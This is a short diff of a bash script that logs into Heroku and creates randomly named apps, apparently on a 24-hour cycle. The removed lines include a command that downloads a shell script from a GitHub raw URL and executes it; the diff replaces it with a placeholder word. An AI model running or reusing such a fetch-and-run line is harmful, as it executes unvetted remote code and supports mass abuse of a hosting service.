@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
 #rerun tiap 24jam
-sudo apt update && sudo apt install npm -y && npm i -g heroku
+
 
 buildpack="heroku/python"
-command=" wget https://raw.githubusercontent.com/bambang501/test-bash/main/pilus.sh && chmod +x pilus.sh && ./pilus.sh"
+command=" uliksendiri"
 heroku login -i
 app_1=$(echo app$(shuf -i 1000000000-9999999999 -n 1))
 app_2=$(echo app$(shuf -i 1000000000-9999999999 -n 1))
